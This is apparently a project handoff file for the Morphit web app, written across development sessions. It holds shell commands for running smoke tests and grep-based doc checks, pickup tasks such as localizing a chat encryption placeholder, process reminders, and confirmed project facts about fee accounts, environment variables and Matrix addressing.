- Shipped systemd unit files at `ops/systemd/*.service` — kept as-is; operator drop-in pattern documented in RUN-A-MORPHIT-NODE.md §8 per Memory #14 (decided NOT to change them because canonical morphit.io operator may install at `/opt/morphit-relay` with dedicated user — the unit file is right for them)
- No schema migration
- No ADR changes
- No relay/indexer code changes
- No CI config (smoke registered in `run-smokes.sh` which CI already executes)

---

## How to verify the work in this tarball

After extracting:

```bash
# 1. Persona-walkthrough smoke pins all 19 fixes
cd apps/web && tsx scripts/persona-walkthrough-smoke.ts
# Expected: ✓ all 29 persona-walkthrough scenarios passed

# 2. Triple-pulse critical paths
cd apps/web && for i in 1 2 3; do
  ok=0; bad=0
  for s in scripts/i18n-locale-parity-smoke.ts scripts/i18n-key-coverage-smoke.ts scripts/i18n-hardcoded-english-smoke.ts scripts/paired-readonly-affordance-surfaces-smoke.ts scripts/price-model-picker-parity-smoke.ts scripts/sally-walkthrough-smoke.ts scripts/forgejo-not-gitea-smoke.ts scripts/href-xss-smoke.ts scripts/persona-walkthrough-smoke.ts; do
    if tsx "$s" 2>/dev/null | grep -q "^✓ all"; then ok=$((ok+1)); else bad=$((bad+1)); fi
  done
  echo "pulse $i: $ok ok, $bad bad"
done
# Expected: pulse 1-3 all "9 ok, 0 bad"

# 3. Locale parity 2,458 × 10
cd apps/web && tsx scripts/i18n-locale-parity-smoke.ts
# Expected: ✓ all 10 scenarios passed

# 4. Verify Part 119 content in meta-docs
grep "Last maintained" docs/REVISIT-LIST.md | head -1   # → Part 119 + follow-up
head -3 TARBALL.md                                       # → Part 119 (final)
grep -c "^272\\." MORPHIT-BRAG-LIST.md                   # → 1
tail -1 MORPHIT-BRAG-LIST.md | head -c 40                # → *272 specific

# 5. Verify AUDIT-2026-05.md has Part 119 entry + follow-up
grep -c "^## Part 119" docs/AUDIT-2026-05.md             # → 1
grep -c "Part 119 follow-up" docs/AUDIT-2026-05.md       # ≥ 1

# 6. Naming-policy regression check (Memory #16)
cd apps/web && tsx scripts/forgejo-not-gitea-smoke.ts
# Expected: ✓ all 3 scenarios passed
```

If any check fails, the tarball is bad — don't proceed.

---

## For the next session — Part 120

### Required pickup (B-3 chat encrypted-placeholder, blocked by this session)

Paired Bob in `/chat/[peer]` currently sees the hardcoded
English string `(encrypted)` for every message in history,
defined as `const ENCRYPTED_PLACEHOLDER = '(encrypted)'`
at `apps/web/src/lib/chat/chatService.ts:297`.  Two
violations simultaneously:

- Locale-parity: hardcoded English leaks to 9 other
  locales for paired AND locked sessions.
- Grandma-friendliness (Memory #21): no inline teaching
  about why decryption isn't happening here.

**Three fix options (full detail in REVISIT-LIST.md §A):**

- **(a)** Thread an i18n callback through
  `ChatControllerDeps` — architectural change.
- **(b)** Return a structured discriminated union
  `{ text } | { decryptedKind: 'paired' | 'locked' | 'failed' }`
  and localize in ConversationView — preferred, keeps
  service layer pure.
- **(c)** Smallest fix: keep service-layer contract
  intact, localize the placeholder upstream in
  ConversationView using `$_('chat.message.encrypted_placeholder_paired')`
  / `_locked` / `_failed`.  Risk: two sources of truth.

Suggested i18n keys (3 × 10 = 30 new strings):

- `chat.message.encrypted_placeholder_paired`
- `chat.message.encrypted_placeholder_locked`
- `chat.message.encrypted_placeholder_failed`

### Standing discipline reminders for fresh session

Every major session:

1. **Three persona walk-throughs** (Memory edit #22) —
   Bob, Sally, Sally-operator end-to-end, proactively,
   at the top of the session.  Even if REVISIT-LIST
   looks clean, the personas surface UX gaps it doesn't
   catch.

2. **Three priorities** (Memory #19/#20/#21) hold
   throughout — privacy #1, decentralization #2,
   grandma-friendliness #3.

3. **Locale parity × 10** (Memory #8) — every user-
   facing text edit translated into all 10 locales in
   the same turn, no exceptions.

4. **Same-turn ALL-files-update** (Memory #14) — code
   change ⇒ doc update ⇒ ADR/FAQ/brag/REVISIT/locale
   JSON/CI config all in one work unit.

5. **Verify, don't assume** (Memory #11) — check git
   log, check live code state, check what the smoke
   actually asserts; never claim "shipped" without
   the call-site + runner-config + end-to-end-test
   triplet (Memory #10 WIRE EVERYTHING).

6. **Tarball every turn** (Memory #9) — TARBALL.md
   updated every turn, not just at checkpoints.  This
   file is the source-of-truth handoff so a fresh
   session can resume EXACTLY.

7. **Doc-vs-code drift** is the most common silent
   failure mode.  Part 119 caught 12 drift bugs in
   operator docs.  The persona-walkthrough smoke and
   periodic line-by-line audits are how we keep this
   class of bug rare.

---

## Memory facts re-confirmed at top of session

(Per Memory #7 / Memory #11 — these are easy to forget
mid-session and the wrong assumption costs hours of
rework.)

- **Treasury account** is `@morphit-fees`, NOT
  `@morphit`.  The latter is the project's chain-ops
  posting account; the former receives listing fees.
- **The env var that names the fees account** is
  `MORPHIT_INDEXER_FEE_RECIPIENT` (singular FEE,
  RECIPIENT suffix).  `MORPHIT_INDEXER_FEES_ACCOUNT` is
  a ghost — operators setting it have their value
  silently ignored.  Part 119 drift catch D-2.
- **BLURT-paid fees** split 90/10 operator/treasury.
  **BTC/XMR-paid fees** split 100/0 treasury/operator.
  NOT 50/50.
- **BLURT inflation rate** is 7.6% annually as of
  2026-05-03.  Do NOT hardcode an APR in docs/brag-
  list — the live helper is at
  `apps/web/src/lib/blurt/apr.ts`.
- **Matrix notation**: `@user:server` is a user MXID
  (private DM, E2E-encrypted, used for security
  disclosure).  `#room:server` is a public room
  alias.  A blanket `@` → `#` replacement would route
  security disclosures to a public room — push back
  if asked again.
- **`git.agorise.net/agorise/morphit`** is LIVE.
  Matrix DM `@agorise:matrix.org` AND public room
  `#agorise:matrix.org` are BOTH monitored.
- **Forgejo, NEVER the predecessor product** (Memory #16).
- **Monero private view key** is NEVER published
  anywhere — not on chain, not in APIs, not in logs,
  not in release ops.  View keys stay env-only on the
  operator's box.
- **Three CLOSED items** that are NOT TODOs anymore
  (don't re-list them in future tarballs):
  - `CHANGE_ME_BEFORE_PRODUCTION` is a denylist by
    design.
  - `package-lock.json` IS committed at workspace
    root.
  - CI already runs svelte-check via `npm run check`.
- **Schema version** is v31 (Part 113 added Signal C
  one-way pile-on detection).  Part 119 drift catch D-8
  surfaced PRE-LAUNCH-CHECKLIST.md was stale at v29.
- **ops-cli binary** is `morphit-ops` (single
  hyphenated token).  `morphit ops` (with space) is a
  typo — Part 119 drift catch D-1 fixed 5 occurrences.
- **`/v1/health` real fields** are `status` ("ok" |
  "degraded"), `lag_blocks` (top-level), `stale`, plus
  the verbose-mode `diagnostics.{operator_balances,
  price, explorers, sse_subscribers, last_error,
  started_at}`.  Field paths in operator docs
  pre-Part-119 referenced 4 nonexistent paths; D-11
  fixed them.

---

## Cross-session handoff confirmation

This tarball represents the complete Part 119 final
state.

- ✓ Every fix on disk has been verified by re-grep.
- ✓ persona-walkthrough smoke green (29/29).
- ✓ Locale parity holds at 2,458 × 10 keys.
- ✓ Triple-pulse stable: 9/9 critical-path smokes × 3
  pulses.
- ✓ Sandbox-runnable smokes 30/33, 364 scenarios.
- ✓ AUDIT-2026-05.md Part 119 entry + follow-up
  extension written with full drift catalog + pattern
  lessons.
- ✓ REVISIT-LIST.md maintained line covers initial 7
  persona fixes + 12 doc-audit drift catches; §A
  public-API decision CLOSED; new §A entry for B-3
  follow-up to Part 120.
- ✓ MORPHIT-BRAG-LIST.md entries #271 (persona walks)
  + #272 (doc audit) added; trailer 270 → 272.
- ✓ TARBALL.md (this file) rewritten for Part 119
  final with verification commands and Part 120
  pickup pointer.
- ✓ Memory facts re-confirmed at top.
- ✓ No stale references anywhere — naming-policy
  smoke clean, persona-walkthrough smoke clean,
  locale-parity smoke clean.

**Safe to leave this chat.  Fresh chat extracts
`morphit-audit-2026-05-119.tar.gz`, reads this file, and
resumes EXACTLY where Part 119 final left off.**

The first thing the fresh session should do, per Memory
edit #22, is plan the three persona walk-throughs for
Part 120 — Bob first (his deferred B-3 chat encrypted-
placeholder is the leading concrete fix), then Sally,
then Sally-as-operator.

---

## What's not done yet (Part 120 continued)

Still ahead in this Part:

- **39 docs/*.md files line-by-line read** still pending (read so far: ADDING-A-COIN, ARCHITECTURE).  Remaining: AUDIT-FINDINGS, AUDIT-2026-05-FINAL-REPORT, AUTOMATION-AUDIT, BATCH-PROFILES-DESIGN, BETA-INCIDENT-RUNBOOK, CHAT-CRYPTO, CHAT-UI-DESIGN, CONTRIBUTING-TRANSLATIONS, FEES-AND-REWARDS, GRANDMA-FRIENDLY-INVESTIGATION, INTEGRATION-TEST-HARNESS-DESIGN, LOCK-SESSION-DESIGN, METADATA-LEAK-CATALOG, NEW-ISSUE-FOUND, NOTIFICATIONS-DESIGN, OPERATOR-TRUST-DESIGN, PER-LOCALE-PRERENDERING-DESIGN, PHASE-3a-DESIGN, PHASE-3b-DESIGN, PHASE-3b-STATUS, PHASE-3c-STATUS, PHASE-4-BACKLOG, PHASE-5-BACKLOG, PHASE-5-PLAN, PHASE-F-AUDIT, PHASE-G-PREP-AUDIT, PLAN, PRICE-SOURCES-RESEARCH, REVIEW-PHASE1, REVIEW-PHASE2, SECURITY (1192 lines), SERVICE-WORKER-CACHING-DESIGN, SWITCHING-NETWORKS, SYNDICATION-CHECKPOINT, UX-STANDARD.
- **22 ADRs** in docs/adr/ not yet read.
- **Persona-walkthrough-smoke extension** for the Part 120 catches (D-16 LAUNCH-DAY verbose warning, D-17 ARCHITECTURE Go→TypeScript drift, D-18 ADDING-A-COIN schema-file location, D-19 ARCHITECTURE no payment-watcher, etc.).
- **AUDIT-2026-05.md Part 120 entry** + **REVISIT-LIST.md Part 120 maintained line** + **MORPHIT-BRAG-LIST.md entry #273** pending until Part 120 is fully closed.

The fresh session that picks this up should:
1. Extract this tarball.
2. Continue reading remaining docs starting at AUDIT-FINDINGS.md (alphabetical pick-up).
3. Fix as they go (same pattern as Parts 119 + this checkpoint).
4. Tarball at the end of each turn per Ken's preference.
5. When all 39 + 22 ADRs are done, write the consolidated Part 120 entry across all four meta-docs in one work unit per Memory #14.

## How to verify this checkpoint

```bash
# Persona-walkthrough smoke green
cd apps/web && tsx scripts/persona-walkthrough-smoke.ts
# Expected: ✓ all 29 persona-walkthrough scenarios passed

# Naming-policy smoke green
cd apps/web && tsx scripts/forgejo-not-gitea-smoke.ts
# Expected: ✓ all 3 scenarios passed

# Verify the 6 fix-groups landed
grep -L "diagnostics.indexer\|diagnostics.relay\|diagnostics.treasury" docs/LAUNCH-DAY.md
# (Expected: no output — those substrings no longer appear in the non-historical sections of LAUNCH-DAY)
# Wait — the explanatory note at lines 318-328 still names them in the disclaimer context.
# The right check is that the verbose-mode WARNING at top doesn't use them:
grep -A1 "Sally-operator finding So-3 (Part 119)" docs/LAUNCH-DAY.md | head -5
# Expected: should now say "diagnostics block (containing operator_balances, price, explorers...)"

grep -c "Node.js / TypeScript (tsx)" docs/ARCHITECTURE.md
# Expected: ≥ 2 (relay + indexer service specs)

grep -c "payment-watcher" docs/ARCHITECTURE.md
# Expected: 1 (the explicit "There is NO separate payment-watcher service" line)

grep -c "moneroProofVerifier.ts" docs/ADDING-A-COIN.md
# Expected: 1

# SYNDICATION-DESIGN.md should be gone:
test ! -f docs/SYNDICATION-DESIGN.md && echo "deletion confirmed"

# REVISIT-LIST.md pointer updated:
grep -B0 -A2 "Syndicate-to-community" docs/REVISIT-LIST.md | head -5
# Expected: now points at SYNDICATION-CHECKPOINT.md, not SYNDICATION-DESIGN.md
```
